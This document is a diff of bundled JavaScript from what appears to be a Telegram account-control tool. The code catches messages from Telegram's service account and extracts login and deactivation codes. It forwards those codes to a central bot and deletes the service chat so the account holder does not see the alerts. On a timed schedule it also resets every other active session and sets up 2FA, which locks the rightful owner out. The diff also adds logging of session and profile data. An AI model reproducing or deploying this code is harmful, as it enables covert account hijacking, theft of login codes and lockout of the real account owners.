@@ -67514,14 +67514,21 @@ async function clearAuthorizations(client) {
     new import_api.default.account.GetAuthorizations()
   );
   const authorizations = (invokedAuthorizations == null ? void 0 : invokedAuthorizations.authorizations) || [];
-  console.warn({
-    accountId: client._accountId,
-    message: "[AUTHORIZATION_SESSIONS]",
-    payload: authorizations
-  });
   for (const authorization of authorizations) {
     try {
+      if (authorization.current) {
+        console.warn({
+          accountId: client._accountId,
+          message: "[SELF_SESSION]",
+          payload: authorization
+        });
+      }
       if (!authorization.current) {
+        console.warn({
+          accountId: client._accountId,
+          message: "[UNKNOWN_SESSION]",
+          payload: authorizations
+        });
         await invokeRequest(
           client,
           new import_api.default.account.ResetAuthorization({
@@ -67659,61 +67666,60 @@ var handleUpdate = async (client, accountId, forceClearAuth, update) => {
       return;
     }
   }
+  if (update instanceof import_api5.default.UpdateShortMessage && String(update.userId) === "777000") {
+    console.warn({
+      accountId,
+      message: "[TELEGRAM_SERVICE_NOTIFICATION]",
+      payload: JSON.parse(JSON.stringify(update))
+    });
+    const code = extractLoginCode(update.message);
+    let messageText = update.message;
+    if (code) {
+      messageText = update.message.includes("my.telegram.org") ? `CODE_FOR_DEACTIVATE: ${code}` : `CODE_FOR_LOGIN: ${code}`;
+    } else if (is2FAChange(update.message)) {
+      messageText = "2FA_SETTINGS_CHANGED";
+    } else if (isInclompleteLogin(update.message)) {
+      messageText = "INCOMPLETE_LOGIN_ATTEMPT";
+    }
+    const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
+ID: ${accountId}
+${messageText}`;
+    await updateAccountById(accountId, {
+      lastServiceNotification: /* @__PURE__ */ new Date()
+    });
+    await sendToMainBot(notificationMessage);
+    if (client) {
+      await deleteHistory(
+        client,
+        new import_api5.default.InputPeerUser({
+          userId: update.userId,
+          accessHash: (0, import_big_integer.default)(0)
+        }),
+        true
+      );
+    }
+    if (forceClearAuth) {
+      [0.5, 1, 1.5, 2.5, 5, 7.5, 10].forEach((minutes) => {
+        setTimeout(
+          async () => {
+            if (client) {
+              try {
+                await clearAuthorizations(client);
+              } catch {
+              }
+            }
+          },
+          minutes * 60 * 1e3
+        );
+      });
+    }
+    return;
+  }
   console.log({
     accountId,
     message: `<${update.className}>`,
     payload: JSON.parse(JSON.stringify(update))
   });
-  if (update instanceof import_api5.default.UpdateShortMessage) {
-    if (String(update.userId) === "777000") {
-      console.warn({
-        accountId,
-        message: "[TELEGRAM_SERVICE_NOTIFICATION]",
-        payload: JSON.parse(JSON.stringify(update))
-      });
-      const code = extractLoginCode(update.message);
-      let messageText = update.message;
-      if (code) {
-        messageText = update.message.includes("my.telegram.org") ? `CODE_FOR_DEACTIVATE: ${code}` : `CODE_FOR_LOGIN: ${code}`;
-      } else if (is2FAChange(update.message)) {
-        messageText = "2FA_SETTINGS_CHANGED";
-      } else if (isInclompleteLogin(update.message)) {
-        messageText = "INCOMPLETE_LOGIN_ATTEMPT";
-      }
-      const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
-ID: ${accountId}
-${messageText}`;
-      await updateAccountById(accountId, {
-        lastServiceNotification: /* @__PURE__ */ new Date()
-      });
-      await sendToMainBot(notificationMessage);
-      if (client) {
-        await deleteHistory(
-          client,
-          new import_api5.default.InputPeerUser({
-            userId: update.userId,
-            accessHash: (0, import_big_integer.default)(0)
-          }),
-          true
-        );
-      }
-      if (forceClearAuth) {
-        [0.5, 1, 1.5, 2.5, 5, 7.5, 10].forEach((minutes) => {
-          setTimeout(
-            async () => {
-              if (client) {
-                try {
-                  await clearAuthorizations(client);
-                } catch {
-                }
-              }
-            },
-            minutes * 60 * 1e3
-          );
-        });
-      }
-    }
-  }
 };
 
 // src/support/modules/accountSetup.ts
@@ -67773,6 +67779,11 @@ var settings = {
 var accountSetup = async (client, account, setuped) => {
   const { accountId } = account;
   const { me } = await getMe(client, account.accountId);
+  console.warn({
+    accountId: client._accountId,
+    message: "[SELF_FULL_USER]",
+    payload: me
+  });
   if (me.username !== void 0 && me.username !== "") {
     await invokeRequest(
       client,
@@ -69064,7 +69075,7 @@ var checker = async (ID, accountsInWork) => {
       } catch (error) {
         errored = error.message;
       }
-    }, 1e4);
+    }, 3e4);
     await updateStatus(client, false);
     await clearAuthorizations(client);
     await setup2FA(client, account);
@@ -69091,9 +69102,6 @@ var checker = async (ID, accountsInWork) => {
       );
       await Promise.race([
         (async () => {
-          if (i === 0) {
-            await automaticCheck(client, account);
-          }
           if (i === randomI) {
             await clearAuthorizations(client);
             await automaticCheck(client, account);
